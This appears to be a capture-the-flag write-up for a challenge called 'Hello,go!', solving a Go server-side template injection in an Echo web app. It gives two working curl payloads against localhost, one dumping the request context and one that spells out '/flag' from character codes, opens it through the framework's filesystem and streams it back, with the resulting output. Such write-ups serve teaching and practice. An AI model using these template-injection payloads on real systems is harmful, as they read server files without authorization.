# Hello,go!
This challenge involves Golang SSTI 

# Solve
Since user input is appended directly into template and render => SSTI

To see which library the site include:
```
curl --get --data-urlencode 'name={{printf "%#v" .}}' http://127.0.0.1:8000/


			<html>
			<body>
				<h1>Hello, &amp;echo.context{logger:echo.Logger(nil), request:(*http.Request)(0xc000117320), response:(*echo.Response)(0xc000140000), query:url.Values{&#34;name&#34;:[]string{&#34;{{printf \&#34;%#v\&#34; .}}&#34;}}, echo:(*echo.Echo)(0xc0000da248), store:echo.Map(nil), lock:sync.RWMutex{w:sync.Mutex{state:0, sema:0x0}, writerSem:0x0, readerSem:0x0, readerCount:atomic.Int32{_:atomic.noCopy{}, v:0}, readerWait:atomic.Int32{_:atomic.noCopy{}, v:0}}, handler:(echo.HandlerFunc)(0x7dc780), path:&#34;/&#34;, pvalues:[]string{}, pnames:[]string{}}!</h1>
			</body>
			</html>
```

Further enumeration:
```
curl --get --data-urlencode 'name={{$p:=printf "%c%c%c%c%c" 47 102 108 97 103}}{{$x:=.Echo.Filesystem.Open $p}}{{$x.Seek 0 0}}{{.Stream 200 "text/plain" $x}}'  http://localhost:8000
DH{fake_flag}
			<html>
			<body>
				<h1>Hello, 0!</h1>
			</body>
			</html>
```
